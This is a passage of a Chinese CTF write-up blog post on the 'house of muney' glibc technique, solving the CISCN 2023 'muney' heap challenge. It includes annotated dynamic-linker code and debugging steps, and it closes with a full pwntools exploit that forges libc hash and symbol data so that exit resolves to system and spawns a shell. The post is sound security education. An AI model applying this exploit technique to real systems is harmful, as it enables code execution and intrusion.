class="hljs-keyword">if</span> (bucket != <span class="hljs-number">0</span>)<br>		&#123;<br>          <span class="hljs-comment">// hasharr，这里也需要伪造对应的值</span><br>		  <span class="hljs-type">const</span> Elf32_Word *hasharr = &amp;<span class="hljs-built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<br><br>		  <span class="hljs-keyword">do</span><br>		    <span class="hljs-title function_">if</span> <span class="hljs-params">(((*hasharr ^ new_hash) &gt;&gt; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)</span><br>		      &#123;<br>			symidx = ELF_MACHINE_HASH_SYMIDX (<span class="hljs-built_in">map</span>, hasharr);<br>			sym = check_match (undef_name, ref, version, flags,<br>					   type_class, &amp;symtab[symidx], symidx,<br>					   strtab, <span class="hljs-built_in">map</span>, &amp;versioned_sym,<br>					   &amp;num_versions);<br>			<span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>)<br>			  <span class="hljs-keyword">goto</span> found_it;<br>		      &#125;<br>		  <span class="hljs-keyword">while</span> ((*hasharr++ &amp; <span class="hljs-number">1u</span>) == <span class="hljs-number">0</span>);<br>		&#125;<br>	    &#125;<br>          <span class="hljs-comment">//....</span><br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>这里是roderick师傅做了注释之后的代码，上面标注了我们需要伪造的值</strong></p>
+<ol>
+<li><strong>bitmask_word</strong></li>
+<li><strong>bucket</strong></li>
+<li><strong>hasharr</strong></li>
+</ol>
+<p><strong>还有两个比较重要的值就是set_name 和set_value，前半部分是通过查找该函数符号和strtab之间的偏移得到的，不同的程序得到的不同，而set_vaule是通过相应的libc环境编译而来的的对于需求函数，这里也是通过调试获得，简而言之，如果控制了<code>set_name </code>就可以正确解析到相应的函数名，控制了<code>set_vaule</code>就可以控制调用函数解析到需求函数的地址进而调用需求函数。</strong></p>
+<p><strong>在2023年的CISCN有一道题目</strong></p>
+<p><strong>muney</strong></p>
+<p><strong>保护策略</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210347892-1068838240.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>ida逆向分析</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210533465-107616031.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>是一个堆题，前提是需要实验http格式发送相应选项，让web手给说个形式</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210630785-1670921104.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>比如使用</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br></code></pre></td></tr></table></figure>
+
+<p><strong>来定义edit函数，其余的以此类推</strong></p>
+<p><strong>这题的漏洞主要在edit函数，只限制不能超过申请堆块大小，但是没有限制长度为负数，也是就可以修改到低地址处的内容，比如可以修改堆块size</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211015877-1316564914.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>此外这题的malloc函数给的范围在0xFFFFF以上及申请0x100000大小的堆块以上，那么意味着申请的堆块由mmp直接分配，那么会在libc上面mmp出一块内存</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211323413-819499018.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>给的后门是exit(&#x2F;bin&#x2F;sh)</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211403813-1820987043.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>如果给exit解析成system即可拿到shell</strong></p>
+<p><strong>这里就需要伪造libc里面的一系列上面提到的内容</strong></p>
+<p><strong>这里给出调试脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./muney&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;127.0.0.1&quot;,&quot;9999&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content_length,content</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /create HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Size: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length)+<span class="hljs-string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /delete HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /quit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> payload<br>gdb.attach(p)<br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,quit())<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>这里需要源码级的调试，在事先导入源码目录</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009181944247-1670551721.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>push n …… 进入 _dl_runtime_resolve</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182201844-1749150943.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>继续步入进入_dl_fixup</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182305126-1445116192.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>在这里先空走一轮while循环，因为这里看的是第二次解析的地址</strong></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182428355-426809747.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>这里看一下bitmask_word 的内容</strong></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182611789-194531855.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182714287-1333394139.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>继续往后走，这里看一下bucket 的内容</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182754029-1445708882.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182828547-1948811624.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>然后看一下hasharr的内容</strong></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009183057264-1232943883.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009183148046-2051995952.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>因为环境是20.04环境，我这里使用20.04虚拟机来找偏移</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009214617372-1605166769.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>这里0x46a40是exit的set_vuale set_name需要找一下strtab和exit字符串的偏移</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215213550-304357691.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215220605-1011567680.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>这里需要尝试，找到哪一个才是真正的偏移。然后需要找一下同环境下的system的set_vuale</strong></p>
+<p><strong>写一个程序验证一下</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-built_in">int</span> main()&#123;<br>char *buff;<br>read(<span class="hljs-number">0</span>,buff,<span class="hljs-number">0x20</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>需要开启延迟绑定，然后关闭pie保护</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215943672-335769811.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>找到发现是0x52290</strong></p>
+<p><strong>那么现在该有的都有，只需要找一下偏移即可</strong></p>
+<p><strong>这里要注意，实际的偏移和输入的偏移相差0x1000，因为在起始地址时候减少了0x1000</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009222548326-1993525860.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>所以这里要输入0x152b78，以此类推</strong></p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br><span class="hljs-comment">#p = process(&quot;./muney&quot;)</span><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content_length,content</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /create HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Size: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length)+<span class="hljs-string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /delete HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /quit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> payload<br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="hljs-number">0x150000</span>,<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span>))<br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,-<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;\x02\x10\x17&#x27;</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,delete(<span class="hljs-number">0</span>))<br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="hljs-number">0x171002</span>,<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">16</span>))<br><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x152b78</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0xf010028c0201130e</span>)))<span class="hljs-comment">#write data to bitmask_word</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x152ca0</span>,<span class="hljs-number">1</span>,p8(<span class="hljs-number">0x86</span>)))<span class="hljs-comment">#write data to bucket</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x153d6c</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0x7c967e3e7c93f2a0</span>)))<span class="hljs-comment">#write data to hasharr</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x8</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&quot;\x90\x22\x05&quot;</span>))<span class="hljs-comment">#write data to exit@st_value</span><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&quot;\xbd\xa1\x1a&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>+<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&quot;\x12&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>+<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&quot;\x0f&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,quit())<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>这里面有几个点需要注意，第一个是bitmask_word的内容做了一点改变，用看见的内容不行，用这个也许0xaaa101010210130e也就是后4位需要注意。</strong></p>
+<p><strong>还有一个就是set_name这个后面4位是需要调试出来的，第四位和第六位程序里面里面得到</strong></p>
+<p><strong>result</strong></p>
+<p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241010001032702-1654813537.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>参考</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/17822130.html">https://www.cnblogs.com/LynneHuan/p/17822130.html</a></strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>house_of_muney[CISCN]</div>
+      <div>https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/" title="[2024领航杯]babyheap题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[2024领航杯]babyheap题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/" title="常回家看看之house_of_emma">
+                        <span class="hidden-mobile">常回家看看之house_of_emma</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
